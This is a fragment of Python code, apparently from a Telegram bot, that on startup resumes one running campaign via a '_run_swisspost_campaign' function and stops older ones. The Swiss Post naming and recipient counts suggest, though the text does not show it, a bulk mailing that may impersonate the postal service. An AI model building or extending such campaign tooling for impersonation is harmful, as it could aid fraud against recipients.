            _mgr = CampaignManager(DB_PATH)
            _running = _mgr.get_campaigns(50)
            _mgr.close()
            _resumed = False
            for _c in _running:
                if _c['status'] == 'running':
                    _cid = _c['id']
                    if not _resumed:
                        print(f'  AUTO-RESUME: Campaign #{_cid} ({_c.get("total_recipients", 0)} recipients)', flush=True)
                        asyncio.create_task(_run_swisspost_campaign(_cid, DB_PATH, int(list(ADMIN_IDS)[0]) if ADMIN_IDS else 0, 'inbox'))
                        _resumed = True
                    else:
                        # Stop old stuck campaigns
                        _mgr2 = CampaignManager(DB_PATH)
                        _mgr2.update_campaign_status(_cid, 'stopped')
                        _mgr2.close()
                        print(f'  AUTO-STOP old campaign #{_cid}', flush=True)
        except Exception as _e:
            print(f'  Auto-resume error: {_e}', flush=True)
    app.post_init = _post_init

    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
